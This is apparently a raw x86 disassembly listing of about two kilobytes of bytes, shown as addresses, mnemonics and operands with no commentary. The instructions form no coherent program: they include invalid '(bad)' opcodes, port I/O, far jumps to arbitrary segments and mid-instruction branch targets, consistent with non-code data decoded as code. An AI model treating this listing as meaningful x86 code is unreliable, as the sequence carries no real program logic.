  4155eb:	xor    esp,DWORD PTR [edi-0x6d]
  4155ee:	in     eax,0x8
  4155f0:	stc    
  4155f1:	xchg   edi,eax
  4155f2:	shl    BYTE PTR [esi],1
  4155f4:	and    BYTE PTR [ebx+0x1e],dl
  4155f7:	dec    edx
  4155f8:	sete   BYTE PTR [ecx]
  4155fb:	retf   
  4155fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4155fd:	and    eax,0x54ad092b
  415602:	mov    dl,0x37
  415604:	xchg   DWORD PTR [ecx],esi
  415606:	jl     0x4155aa
  415608:	sub    eax,0x60314d04
  41560d:	sbb    bh,BYTE PTR [edi+0xf]
  415610:	pop    es
  415611:	or     ebx,DWORD PTR [eax]
  415613:	mov    cs,WORD PTR [edx+0x7e]
  415616:	jo     0x41561f
  415618:	and    al,0xb1
  41561a:	out    dx,eax
  41561b:	imul   dl
  41561d:	pop    ecx
  41561e:	xchg   edi,eax
  41561f:	xchg   ebp,eax
  415620:	inc    ecx
  415621:	test   ah,al
  415623:	sub    BYTE PTR [ecx],ch
  415625:	popa   
  415626:	push   cs
  415627:	jmp    0x415610
  415629:	mov    ch,0xb8
  41562b:	cmp    ch,BYTE PTR [esi]
  41562d:	or     eax,0x34840a5b
  415632:	sar    DWORD PTR [ebp+0x34],cl
  415635:	mov    dh,0x2
  415637:	push   edx
  415638:	mov    ds:0x93843598,eax
  41563d:	xor    bh,BYTE PTR [esi-0x184c0ab3]
  415643:	mov    eax,0x4b69dff2
  415648:	or     edx,eax
  41564a:	xchg   edx,eax
  41564b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41564c:	sbb    eax,0x601f644c
  415651:	add    eax,DWORD PTR [edx-0x4530f1f7]
  415657:	mov    ebp,0x154150c4
  41565c:	fcomp  DWORD PTR gs:[ecx-0x35]
  415660:	cmp    al,0x2b
  415662:	cmc    
  415663:	fs cmp eax,0x32926c51
  415669:	sti    
  41566a:	test   BYTE PTR [ecx-0x6c],dl
  41566d:	jmp    0x5bc0:0x3133496d
  415674:	dec    esp
  415675:	jle    0x4156be
  415677:	push   ecx
  415678:	mov    al,0x73
  41567a:	icebp  
  41567b:	rol    DWORD PTR [edi-0x43099b7e],cl
  415681:	cmp    BYTE PTR [esp+eax*2-0x2],cl
  415685:	nop
  415686:	push   ebp
  415687:	sar    DWORD PTR [ebp-0x48],cl
  41568a:	int3   
  41568b:	mov    DWORD PTR [ebx+0x27],eax
  41568e:	add    al,0x70
  415690:	push   cs
  415691:	stos   DWORD PTR es:[edi],eax
  415692:	scas   eax,DWORD PTR es:[edi]
  415693:	outs   dx,BYTE PTR ds:[esi]
  415694:	push   edx
  415695:	imul   ecx,DWORD PTR [edx+0x2d],0xffffffd9
  415699:	jmp    0x415647
  41569b:	sub    ebx,esp
  41569d:	ret    0x4189
  4156a0:	stos   DWORD PTR es:[edi],eax
  4156a1:	fmul   QWORD PTR [edx+0x3e]
  4156a4:	xchg   ecx,eax
  4156a5:	js     0x415676
  4156a7:	iret   
  4156a8:	inc    esp
  4156a9:	jno    0x4156d9
  4156ab:	push   ecx
  4156ac:	fst    QWORD PTR [ecx]
  4156ae:	xor    bh,BYTE PTR [eax]
  4156b0:	sub    edi,DWORD PTR ds:0x8164d91e
  4156b6:	mov    dl,0xb6
  4156b8:	mov    dl,0x27
  4156ba:	inc    ecx
  4156bb:	pop    esi
  4156bc:	push   ebp
  4156bd:	jecxz  0x415708
  4156bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156c0:	(bad)  
  4156c1:	pusha  
  4156c2:	mul    DWORD PTR [edx-0x6b63c024]
  4156c8:	lahf   
  4156c9:	mov    dl,0xa4
  4156cb:	or     BYTE PTR [eax+0x21],0x37
  4156cf:	stos   BYTE PTR es:[edi],al
  4156d0:	jae    0x41571b
  4156d2:	clc    
  4156d3:	popa   
  4156d4:	jg     0x415666
  4156d6:	add    ebx,DWORD PTR [edx]
  4156d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4156d9:	adc    esp,ebp
  4156db:	out    dx,al
  4156dc:	inc    eax
  4156dd:	mov    edx,0x11278c45
  4156e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4156e3:	inc    esp
  4156e4:	iret   
  4156e5:	scas   al,BYTE PTR es:[edi]
  4156e6:	mov    edi,0xd227e6e0
  4156eb:	popf   
  4156ec:	xrelease xchg DWORD PTR [edx+0x0],ebx
  4156f0:	xor    ah,BYTE PTR [ebp+0x2f]
  4156f3:	inc    ecx
  4156f4:	jne    0x415697
  4156f6:	add    al,0x20
  4156f8:	xchg   ebp,eax
  4156f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4156fa:	inc    ecx
  4156fb:	popa   
  4156fc:	push   es
  4156fd:	mov    bh,0x7
  4156ff:	loope  0x4156eb
  415701:	sub    eax,0xb81069e3
  415706:	inc    esp
  415707:	cmp    esi,0x77
  41570a:	cmc    
  41570b:	xor    BYTE PTR [ecx+0x40],dl
  41570e:	sbb    al,0x1f
  415710:	popa   
  415711:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415712:	mov    dl,0x3b
  415714:	bound  esp,QWORD PTR [esi+0x61c1b92c]
  41571a:	call   0xdd6b5218
  41571f:	pop    ss
  415720:	out    0x15,eax
  415722:	inc    esp
  415723:	shr    BYTE PTR [ebx+0x1c],0xf0
  415727:	in     al,0x58
  415729:	sbb    DWORD PTR [esi],ebx
  41572b:	push   cx
  41572d:	ss push es
  41572f:	push   ss
  415730:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415731:	test   edi,edx
  415733:	and    DWORD PTR [edi-0x80],eax
  415736:	sbb    dh,BYTE PTR [ebx]
  415738:	add    eax,0x897ecd01
  41573d:	out    0x5c,al
  41573f:	or     esi,DWORD PTR [edx]
  415741:	and    al,0xd8
  415743:	aam    0xec
  415745:	mov    cl,0xb0
  415747:	mov    ebx,0x73496b78
  41574c:	popf   
  41574d:	mov    edx,0xf16bbcb0
  415752:	cmp    eax,0x82b35eac
  415757:	xchg   ebp,eax
  415758:	ret    0x94dc
  41575b:	ror    DWORD PTR [edi-0x7a1acba6],cl
  415761:	int    0x83
  415763:	mov    dl,0xb4
  415765:	xor    eax,0x1ce6bb01
  41576a:	jno    0x415712
  41576c:	add    DWORD PTR [edx+0x16427b44],edx
  415772:	(bad)  
  415773:	out    dx,eax
  415774:	pop    es
  415775:	das    
  415776:	xor    bl,BYTE PTR [edi]
  415778:	jle    0x4157bf
  41577a:	ret    0xb17f
  41577d:	sbb    DWORD PTR [esi],ecx
  41577f:	cmp    ebx,ebp
  415781:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415782:	cwde   
  415783:	mov    ch,0x8c
  415785:	out    0x81,al
  415787:	(bad)  [ebx-0xd]
  41578a:	pop    eax
  41578b:	or     al,0x17
  41578d:	ins    DWORD PTR es:[edi],dx
  41578e:	push   edi
  41578f:	(bad)
  415792:	pop    ss
  415793:	mov    eax,0xc7b19f30
  415798:	call   0x4dfb375f
  41579d:	fsub   DWORD PTR [ebp+0x7d0ead9c]
  4157a3:	pop    ecx
  4157a4:	test   eax,0x9c1a1496
  4157a9:	in     al,dx
  4157aa:	pop    ss
  4157ab:	sbb    eax,0x21bafa5b
  4157b0:	data16 hlt 
  4157b2:	rcl    DWORD PTR ds:0x88da416,cl
  4157b8:	xchg   edx,eax
  4157b9:	call   0xda80:0x4360de96
  4157c0:	sub    BYTE PTR [esi+0x52dff73b],ch
  4157c6:	(bad)  
  4157c7:	idiv   DWORD PTR [ebx]
  4157c9:	dec    ebx
  4157ca:	sub    eax,0x913f4c59
  4157cf:	mov    esp,0x3659f83c
  4157d4:	adc    dl,BYTE PTR [ebp-0x1a9e1c3d]
  4157da:	ds lock retf 0xa674
  4157df:	inc    edi
  4157e0:	repz jb 0x4157de
  4157e3:	enter  0xdeff,0xbe
  4157e7:	fdiv   st(3),st
  4157e9:	cwde   
  4157ea:	push   edx
  4157eb:	test   DWORD PTR [eax+ecx*2],ecx
  4157ee:	outs   dx,BYTE PTR ds:[esi]
  4157ef:	rol    BYTE PTR [ebp+0x7952ea72],0xbc
  4157f6:	dec    eax
  4157f7:	cmp    ch,BYTE PTR [edi-0x3]
  4157fa:	sbb    ebx,ecx
  4157fc:	popa   
  4157fd:	mov    ds:0xe2b6fc2a,eax
  415802:	jmp    0x7cca:0x599248b7
  415809:	sub    al,0x90
  41580b:	les    eax,FWORD PTR [ebp+0xa2418cf]
  415811:	into   
  415812:	xor    al,0xe5
  415814:	scas   eax,DWORD PTR es:[edi]
  415815:	dec    edi
  415816:	push   DWORD PTR [ecx]
  415818:	aad    0xb7
  41581a:	add    al,0x7e
  41581c:	mov    ah,0xae
  41581e:	loop   0x4157b9
  415820:	jo     0x415811
  415822:	jne    0x4157d9
  415824:	leave  
  415825:	xchg   edx,eax
  415826:	jmp    0x6cf6:0x958df3dc
  41582d:	xor    al,BYTE PTR [edi+0x359f2d10]
  415833:	cmp    eax,0xe59d047e
  415838:	adc    DWORD PTR [ebx+0x156b97c],ebp
  41583e:	push   edi
  41583f:	mov    al,ds:0xfd78c9da
  415844:	pop    esp
  415845:	cmp    DWORD PTR [ebx-0x5b314100],edx
  41584b:	out    0x18,al
  41584d:	fst    QWORD PTR [edi-0x9]
  415850:	xor    bl,dh
  415852:	js     0x415833
  415854:	pop    ds
  415855:	or     al,BYTE PTR [edi-0x5e]
  415858:	fcomp  st(1)
  41585a:	push   ebx
  41585b:	fdiv   DWORD PTR [ebp+0x26]
  41585e:	sbb    DWORD PTR [edi-0xb],edi
  415861:	ja     0x415860
  415863:	add    eax,0x4b49f1ce
  415868:	arpl   si,di
  41586a:	in     al,0x59
  41586c:	xor    eax,0x72f1b9ce
  415871:	sti    
  415872:	pop    esp
  415873:	pop    esi
  415874:	les    eax,FWORD PTR ds:0xb6c465e0
  41587a:	cwde   
  41587b:	xchg   esi,eax
  41587c:	les    esi,FWORD PTR [ebp-0x1a6ea151]
  415882:	jge    0x415864
  415884:	or     eax,0xd33bf2d
  415889:	sub    ebp,esi
  41588b:	pushf  
  41588c:	bound  ebp,QWORD PTR [edi+esi*1]
  41588f:	loopne 0x4158e3
  415891:	push   ds
  415892:	push   esi
  415893:	lea    esi,[eax+ebx*1+0x78193f72]
  41589a:	jns    0x415823
  41589c:	test   DWORD PTR [eax-0x21],eax
  41589f:	repz aad 0xfb
  4158a2:	add    BYTE PTR [esi-0x447c213e],dl
  4158a8:	dec    ebp
  4158a9:	popa   
  4158aa:	(bad)  
  4158ab:	jl     0x4158ed
  4158ad:	and    ebx,DWORD PTR [edx-0x67556011]
  4158b3:	fldenv [edx-0x651f2c9]
  4158b9:	in     eax,dx
  4158ba:	enter  0x8939,0x90
  4158be:	xchg   edi,eax
  4158bf:	cmp    eax,0x3e657ec2
  4158c4:	in     eax,0xcc
  4158c6:	test   dh,bh
  4158c8:	push   ss
  4158c9:	cmp    bh,BYTE PTR [edx]
  4158cb:	mov    bh,BYTE PTR [ecx+edi*4]
  4158ce:	repnz aas 
  4158d0:	adc    BYTE PTR [ebp+0x27db7d52],ch
  4158d6:	iret   
  4158d7:	fisttp QWORD PTR [esp+edx*4]
  4158da:	sbb    BYTE PTR [edi-0x28],al
  4158dd:	adc    al,0xd0
  4158df:	ins    BYTE PTR es:[edi],dx
  4158e0:	xchg   esp,eax
  4158e1:	call   0x5b1d:0x2399daa5
  4158e8:	pop    es
  4158e9:	ja     0x4158c6
  4158eb:	out    0x8b,eax
  4158ed:	inc    ebp
  4158ee:	or     al,0x23
  4158f0:	cli    
  4158f1:	jmp    0x415e03
  4158f6:	aas    
  4158f7:	ret    0x3dce
  4158fa:	rcl    ecx,1
  4158fc:	iret   
  4158fd:	ret    0x3f53
  415900:	dec    ecx
  415901:	xchg   esi,eax
  415902:	cdq    
  415903:	fs or  al,0xbb
  415906:	mov    dh,BYTE PTR ds:0x7c73787f
  41590c:	js     0x415986
  41590e:	sbb    bl,bh
  415910:	test   BYTE PTR [edi+0x2a],al
  415913:	popa   
  415914:	mov    edi,0x289d19aa
  415919:	mov    esi,0x82351ec4
  41591e:	and    DWORD PTR [esp+esi*4+0x7a468f8b],0x89428733
  415929:	pop    ecx
  41592a:	mov    eax,esi
  41592c:	test   al,0x8a
  41592e:	mov    bh,0xc6
  415930:	enter  0x49d3,0xe6
  415934:	cdq    
  415935:	xlat   BYTE PTR ds:[ebx]
  415936:	dec    esi
  415937:	lea    ecx,[ebx]
  415939:	loop   0x415991
  41593b:	mov    ebx,ebx
  41593d:	pop    ds
  41593e:	fimul  WORD PTR [ebx+esi*2-0x440536bf]
  415945:	(bad)  
  415946:	push   ebp
  415947:	repz pop ss
  415949:	sub    eax,0xb89b21a8
  41594e:	jmp    0x4158d2
  415950:	retf   0x3a06
  415953:	das    
  415954:	add    al,BYTE PTR [ebx]
  415956:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415957:	daa    
  415958:	fiadd  DWORD PTR [eax-0x6c2d3763]
  41595e:	jecxz  0x41599b
  415960:	repz fld st(6)
  415963:	mov    WORD PTR [edx],ds
  415965:	fcomp  DWORD PTR [edx]
  415967:	xlat   BYTE PTR ds:[ebx]
  415968:	ficomp DWORD PTR [eax+esi*2+0x71]
  41596c:	hlt    
  41596d:	sub    al,0xd8
  41596f:	lock jne 0x415927
  415972:	jb     0x415911
  415974:	stc    
  415975:	iret   
  415976:	or     bh,BYTE PTR [ebx]
  415978:	and    BYTE PTR cs:[edi+0x3f],ah
  41597c:	mov    ebp,0x2c2d7f75
  415981:	sub    BYTE PTR [eax+ebx*1],cl
  415984:	jns    0x4159dd
  415986:	sub    eax,0x14093bb8
  41598b:	call   0xf5bc:0x80514cc8
  415992:	sub    DWORD PTR [edi-0x24],ebp
  415995:	jne    0x4159d4
  415997:	push   esp
  415998:	add    al,0x19
  41599a:	ror    DWORD PTR [ebx-0x5a],1
  41599d:	mov    esp,0xe69a0465
  4159a2:	pushf  
  4159a3:	leave  
  4159a4:	leave  
  4159a5:	xchg   esp,eax
  4159a6:	add    cl,BYTE PTR [esi]
  4159a8:	ins    BYTE PTR es:[edi],dx
  4159a9:	shl    ch,1
  4159ab:	xor    al,0x80
  4159ad:	out    0xc5,al
  4159af:	idiv   BYTE PTR [edi]
  4159b1:	gs mov ah,0x7d
  4159b4:	icebp  
  4159b5:	loopne 0x415938
  4159b7:	mov    eax,ds:0x1ccece9a
  4159bc:	addr16 lahf 
  4159be:	adc    BYTE PTR [edx-0x15],ah
  4159c1:	mov    esi,0x2fe981d1
  4159c6:	and    esi,DWORD PTR [edi]
  4159c8:	mov    dh,0x80
  4159ca:	mov    dl,0xb6
  4159cc:	sbb    dh,ch
  4159ce:	dec    eax
  4159cf:	adc    eax,0x948be2db
  4159d4:	mov    edx,0xdb348dec
  4159d9:	jecxz  0x4159c6
  4159db:	jl     0x415a53
  4159dd:	popf   
  4159de:	dec    edi
  4159df:	pop    ecx
  4159e0:	and    eax,0xd504fe67
  4159e5:	retf   
  4159e6:	inc    ecx
  4159e7:	(bad)  
  4159e8:	pop    ss
  4159e9:	dec    esi
  4159ea:	sub    BYTE PTR [edx+ebx*8+0x53f44161],0xf
  4159f2:	jmp    0x388ed168
  4159f7:	mov    dh,0xdc
  4159f9:	sub    BYTE PTR [eax+0x4e],bh
  4159fc:	mov    esi,0x3f517f7f
  415a02:	das    
  415a03:	rol    BYTE PTR fs:[esi-0x4a918a25],cl
  415a0a:	xchg   esi,eax
  415a0b:	sub    BYTE PTR [edx-0x20b069ef],0xaf
  415a12:	in     eax,0xba
  415a14:	inc    edx
  415a15:	loope  0x4159c4
  415a17:	pushf  
  415a18:	iret   
  415a19:	mov    dl,0x8a
  415a1b:	mov    bh,0x3a
  415a1d:	dec    ebx
  415a1e:	mov    ds:0xce8a93e5,al
  415a23:	mov    bh,0xb7
  415a25:	push   ebx
  415a26:	repnz push edi
  415a28:	loope  0x4159d9
  415a2a:	bound  edx,QWORD PTR [ebx]
  415a2c:	mov    ch,ah
  415a2e:	sub    al,0x32
  415a30:	or     BYTE PTR [ebx-0x78999199],cl
  415a36:	xchg   ebp,eax
  415a37:	into   
  415a38:	sub    esi,DWORD PTR [esi+0x30166c95]
  415a3e:	adc    edx,0x8470bbe8
  415a44:	int    0x99
  415a46:	pusha  
  415a47:	push   0xffffffcd
  415a49:	mov    ebx,0xfd0d1d89
  415a4e:	and    DWORD PTR [edi-0x6a127343],0xd6c34bcd
  415a58:	sbb    dl,BYTE PTR [edi-0x7e189d9b]
  415a5e:	fisubr WORD PTR [ebx-0x29]
  415a61:	cwde   
  415a62:	div    DWORD PTR [edi-0x10]
  415a65:	sbb    ah,BYTE PTR [ebp+0x3a231b24]
  415a6b:	mov    ?,WORD PTR [edx-0x71e1df3b]
  415a71:	push   0x39207e4d
  415a76:	or     BYTE PTR [edi-0x61],bh
  415a79:	sbb    ch,BYTE PTR [ebx-0x22a30540]
  415a7f:	and    eax,0x4331ffaa
  415a84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a85:	jmp    0xc57:0xfd773164
  415a8c:	jne    0x415ad7
  415a8e:	enter  0xe224,0xc0
  415a92:	and    DWORD PTR [edx-0x7fad00d1],ebx
  415a98:	out    dx,eax
  415a99:	cmp    ebx,DWORD PTR [edi*2+0x4f376074]
  415aa0:	and    al,0x9e
  415aa2:	push   edx
  415aa3:	jo     0x415a69
  415aa5:	mov    ds,ebx
  415aa7:	pop    es
  415aa8:	inc    ebp
  415aa9:	mov    eax,0xfb51fda1
  415aae:	pop    esi
  415aaf:	and    ebx,edi
  415ab1:	sar    BYTE PTR [esi-0x56493511],0xfc
  415ab8:	mov    cl,0xcc
  415aba:	cmp    al,0x3c
  415abc:	dec    edi
  415abd:	bound  ecx,QWORD PTR [edi]
  415abf:	mov    WORD PTR ds:0xd59a8cb9,ss
  415ac5:	and    BYTE PTR [ebx+0x6d6e1e45],bl
  415acb:	sar    BYTE PTR [edi],cl
  415acd:	dec    esi
  415ace:	mov    edx,0xa28e08b0
  415ad3:	enter  0xd493,0x5b
  415ad7:	daa    
  415ad8:	mov    DWORD PTR [edx],esi
  415ada:	xchg   ecx,eax
  415adb:	xor    BYTE PTR [ebx+0x2b808065],ch
  415ae1:	cmp    DWORD PTR [esi],0x65355d16
  415ae7:	cmp    eax,0x5b03113e
  415aec:	and    eax,0xe6cb416f
  415af1:	(bad)  
  415af2:	push   ebp
  415af3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415af4:	adc    DWORD PTR [ebx],0xa701ec55
  415afa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415afb:	in     al,dx
  415afc:	fxch   st(3)
  415afe:	fisttp DWORD PTR ds:0x25c0344f
  415b04:	lods   eax,DWORD PTR ds:[esi]
  415b05:	in     eax,0xa3
  415b07:	fsub   DWORD PTR [edi]
  415b09:	rcl    cl,0xe7
  415b0c:	xor    BYTE PTR [eax],0x73
  415b0f:	xchg   esi,eax
  415b10:	js     0x415b27
  415b12:	test   DWORD PTR [esi-0x34],ebx
  415b15:	xchg   esi,eax
  415b16:	cs ret 0xc2a9
  415b1a:	xchg   edx,eax
  415b1b:	push   ecx
  415b1c:	fwait
  415b1d:	imul   BYTE PTR [ecx-0x4]
  415b20:	ja     0x415b1a
  415b22:	sbb    al,0xe0
  415b24:	pop    ds
  415b25:	das    
  415b26:	inc    ebx
  415b27:	shr    BYTE PTR [ecx-0xd],cl
  415b2a:	jno    0x415ad4
  415b2c:	inc    ebp
  415b2d:	int3   
  415b2e:	mov    bl,BYTE PTR [ebx-0x46]
  415b31:	cwde   
  415b32:	jne    0x415b01
  415b34:	add    BYTE PTR [ebx-0x3],bl
  415b37:	ret    0xc893
  415b3a:	mov    DWORD PTR [edi+0x2bcadfca],esp
  415b40:	test   ebx,ecx
  415b42:	pop    ds
  415b43:	outs   dx,BYTE PTR ds:[esi]
  415b44:	push   ebx
  415b45:	pop    ebp
  415b46:	mov    ds:0x4c705133,eax
  415b4b:	pop    esp
  415b4c:	outs   dx,BYTE PTR ds:[esi]
  415b4d:	mov    al,0x2a
  415b4f:	and    al,0xe4
  415b51:	inc    ecx
  415b52:	lods   eax,DWORD PTR ds:[esi]
  415b53:	daa    
  415b54:	mov    ds:0x914de74f,al
  415b59:	into   
  415b5a:	jb     0x415b4f
  415b5c:	mov    dh,0x8f
  415b5e:	iret   
  415b5f:	push   ds
  415b60:	or     BYTE PTR [ebx+0x3e],al
  415b63:	lods   eax,DWORD PTR ds:[esi]
  415b64:	push   ss
  415b65:	sbb    DWORD PTR [edx+edi*2+0x2e],edi
  415b69:	bound  esi,QWORD PTR [eax]
  415b6b:	and    al,0x0
  415b6d:	cs pop eax
  415b6f:	fisttp WORD PTR [esi]
  415b71:	fadd   DWORD PTR [ebx-0x7d]
  415b74:	ja     0x415b2e
  415b76:	adc    DWORD PTR [ecx-0x4b],eax
  415b79:	pop    ebp
  415b7a:	fidiv  WORD PTR [ecx+0x69]
  415b7d:	ins    DWORD PTR es:[edi],dx
  415b7e:	add    eax,0x30004a35
  415b83:	pop    ds
  415b84:	mov    cl,0xe6
  415b86:	mov    al,0x92
  415b88:	xchg   BYTE PTR [edi],dl
  415b8a:	retf   
  415b8b:	dec    esi
  415b8c:	ja     0x415ba0
  415b8e:	cmp    al,0x6a
  415b90:	dec    esi
  415b91:	xor    BYTE PTR [eax+ecx*2+0x746a48b4],bl
  415b98:	and    al,0xb0
  415b9a:	rol    al,cl
  415b9c:	pop    esp
  415b9e:	scas   al,BYTE PTR es:[edi]
  415b9f:	aam    0x37
  415ba1:	outs   dx,DWORD PTR ds:[esi]
  415ba2:	mov    eax,0x419c7ff8
  415ba7:	aas    
  415ba8:	xchg   BYTE PTR [esi*2-0x6c801ff1],ch
  415baf:	jl     0x415bd5
  415bb1:	je     0x415bfa
  415bb3:	or     eax,0xd52e1d48
  415bb8:	arpl   cx,di
  415bba:	push   cs
  415bbb:	arpl   di,ax
  415bbd:	pop    edi
  415bbe:	ror    ah,0x57
  415bc1:	xchg   ecx,eax
  415bc2:	fld    QWORD PTR [edi]
  415bc4:	icebp  
  415bc5:	fbld   TBYTE PTR [edx-0x46]
  415bc8:	pop    ss
  415bc9:	add    BYTE PTR [edi+edi*8],bh
  415bcc:	pop    ecx
  415bcd:	inc    ebx
  415bce:	in     eax,0x8b
  415bd0:	inc    ebp
  415bd1:	das    
  415bd2:	ret    0x75c9
  415bd5:	inc    edi
  415bd6:	hlt    
  415bd7:	or     ch,al
  415bd9:	test   DWORD PTR [edi],0xee36a9c6
  415bdf:	inc    ebp
  415be0:	mov    ebp,0xd36ae284
  415be5:	adc    eax,0xc92fe43c
  415bea:	lahf   
  415beb:	mov    ebx,0x213c76ae
  415bf0:	sbb    ecx,DWORD PTR [eax+eax*8-0x49adc51]
  415bf7:	ret    
  415bf8:	ja     0x415bcd
  415bfa:	adc    ch,BYTE PTR [eax+0x6141777d]
  415c00:	(bad)  
  415c01:	mov    ds:0xfed01418,al
  415c06:	pop    ds
  415c07:	or     al,0xb6
  415c09:	or     BYTE PTR [ecx+0x3919deac],ah
  415c0f:	clc    
  415c10:	fpatan 
  415c12:	loopne 0x415c1d
  415c14:	scas   al,BYTE PTR es:[edi]
  415c15:	jmp    0x415bdd
  415c17:	outs   dx,DWORD PTR ds:[esi]
  415c18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c19:	adc    DWORD PTR [ebx+0x69],0x402fbe9c
  415c20:	push   edx
  415c21:	ds push es
  415c23:	mov    BYTE PTR [ecx+edx*2+0x58020294],dl
  415c2a:	jmp    0x415bb6
  415c2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c2d:	loop   0x415c32
  415c2f:	mov    edx,0x1306f3cf
  415c34:	inc    edi
  415c35:	pop    es
  415c36:	pusha  
  415c37:	jae    0x415c85
  415c39:	sar    DWORD PTR [edi],1
  415c3b:	pop    ebx
  415c3c:	test   al,0xe3
  415c3e:	outs   dx,DWORD PTR ds:[esi]
  415c3f:	fnstcw WORD PTR [edi+edx*4-0x9b7ed17]
  415c46:	mov    ecx,0xb6aa3b55
  415c4b:	xor    esp,DWORD PTR [esi+0x19ded7e5]
  415c51:	jmp    0x8958f9c6
  415c56:	add    eax,0xbdcc3084
  415c5b:	dec    edi
  415c5c:	rcr    DWORD PTR [edi+0x55],cl
  415c5f:	add    DWORD PTR [esp+ebp*4-0x1d],0x6e
  415c64:	mov    bl,0x39
  415c66:	inc    esp
  415c67:	cdq    
  415c68:	jne    0x415cd6
  415c6a:	stos   DWORD PTR es:[edi],eax
  415c6b:	sub    ebx,DWORD PTR [edi+0x412c066c]
  415c71:	loope  0x415c62
  415c73:	call   0xaf2:0x75b6bcf9
  415c7a:	add    edi,DWORD PTR [ebp+0x3d632f90]
  415c80:	int3   
  415c81:	add    ecx,esp
  415c83:	mov    al,0x2a
  415c85:	adc    dl,ch
  415c87:	sbb    DWORD PTR [esi+0x5c],edx
  415c8a:	dec    ecx
  415c8b:	loopne 0x415d04
  415c8d:	push   ebp
  415c8e:	fdivr  DWORD PTR [ebp-0x9]
  415c91:	mov    dl,0x86
  415c93:	(bad)  
  415c95:	test   al,0xca
  415c97:	dec    edi
  415c98:	int    0x4e
  415c9a:	or     bh,ah
  415c9c:	sbb    DWORD PTR [ebp+ebp*1+0x26],esp
  415ca0:	add    eax,0xe0b5da17
  415ca5:	outs   dx,DWORD PTR ds:[esi]
  415ca6:	inc    ecx
  415ca7:	cs iret 
  415ca9:	ja     0x415c81
  415cab:	mov    ecx,0xcd7bff7b
  415cb0:	push   0xc0ac4da
  415cb5:	mov    esi,0x49ce4cd0
  415cba:	fwait
  415cbb:	(bad)  
  415cbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415cbd:	push   esp
  415cbe:	adc    bh,BYTE PTR [ecx+edx*2+0x57]
  415cc2:	ret    0x8f54
  415cc5:	jge    0x415c6a
  415cc7:	push   ebp
  415cc8:	jns    0x415d43
  415cca:	push   edx
  415ccb:	mov    al,0xae
  415ccd:	fcom   st(7)
  415ccf:	popa   
  415cd0:	xor    DWORD PTR [edx-0x1909f097],edi
  415cd6:	(bad)  
  415cd7:	fdiv   DWORD PTR [edx+0x655b4dd9]
  415cdd:	sar    BYTE PTR [ecx],0x23
  415ce0:	mov    bh,0x6
  415ce2:	imul   edi,DWORD PTR [eax+0x5f499b1c],0xd0545d23
  415cec:	lods   eax,DWORD PTR ds:[esi]
  415ced:	sbb    DWORD PTR [edi],esp
  415cef:	es lahf 
  415cf1:	ret    
  415cf2:	lods   eax,DWORD PTR ds:[esi]
  415cf3:	push   ebx
  415cf4:	push   ds
  415cf5:	ret    0x5b26
  415cf8:	pop    ebp
  415cf9:	out    dx,al
  415cfa:	das    
  415cfb:	(bad)  
  415cfd:	scas   al,BYTE PTR es:[edi]
  415cfe:	cmovs  eax,DWORD PTR [ecx+0x1e]
  415d02:	rol    DWORD PTR [eax-0x5b],1
  415d05:	mov    dl,BYTE PTR [esi-0x26]
  415d08:	xchg   DWORD PTR [ebx+0x6b],ebx
  415d0b:	dec    edx
  415d0c:	mov    dl,BYTE PTR [eax+0x7ce71a30]
  415d12:	and    eax,0x4dcb300a
  415d17:	pop    esp
  415d18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d19:	pusha  
  415d1a:	or     al,0xc6
  415d1c:	adc    DWORD PTR [eax],ebx
  415d1e:	jmp    0x415cad
  415d20:	das    
  415d21:	dec    ebp
  415d22:	push   edi
  415d23:	test   bh,0xbf
  415d26:	adc    DWORD PTR [edi+0x13],esi
  415d29:	mov    ds:0xe17e6ef2,eax
  415d2e:	in     al,0x7b
  415d30:	cmp    DWORD PTR ds:0x7f459025,esp
  415d36:	sub    al,BYTE PTR [ebx+0x54d9aa22]
  415d3c:	push   0xffffffb0
  415d3e:	add    bh,ah
  415d40:	pop    esp
  415d41:	jno    0x415d28
  415d43:	cs call 0xfc5f:0x888a5e2b
  415d4b:	in     al,dx
  415d4c:	fdivr  st,st(5)
  415d4e:	jo     0x415d1b
  415d50:	sbb    DWORD PTR cs:[esp+ebp*4],esp
  415d54:	jl     0x415da6
  415d56:	jo     0x415d37
  415d58:	cdq    
  415d59:	add    DWORD PTR [ecx+0x354e4f14],edx
  415d5f:	and    al,0xf2
  415d61:	aaa    
  415d62:	xor    al,0x20
  415d64:	push   eax
  415d65:	(bad)  
  415d67:	dec    esi
  415d68:	mov    ebx,0x7b8e9174
  415d6d:	or     DWORD PTR [ebx+0x7],ecx
  415d70:	push   ebx
  415d71:	pop    edi
  415d72:	out    0x48,eax
  415d74:	push   es
  415d75:	xchg   esp,eax
  415d76:	jno    0x415d5b
  415d78:	dec    esp
  415d79:	xor    eax,0x2dcf996c
  415d7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d7f:	add    eax,0x2b5c99f7
  415d84:	bound  esp,QWORD PTR [ebx]
  415d86:	inc    ebp
  415d87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d88:	outs   dx,DWORD PTR ds:[esi]
  415d89:	test   BYTE PTR [edx-0x72],ah
  415d8c:	sbb    DWORD PTR [ebp+0x44],eax
  415d8f:	mov    eax,ds:0x45305582
  415d94:	cmp    eax,0x430b580d
  415d99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d9a:	or     BYTE PTR [ebp+0x129600c0],ah
  415da0:	pop    eax
  415da1:	fisub  DWORD PTR [eax]
  415da3:	lods   al,BYTE PTR ds:[esi]
  415da4:	shr    edx,0xda
  415da7:	xchg   edi,eax
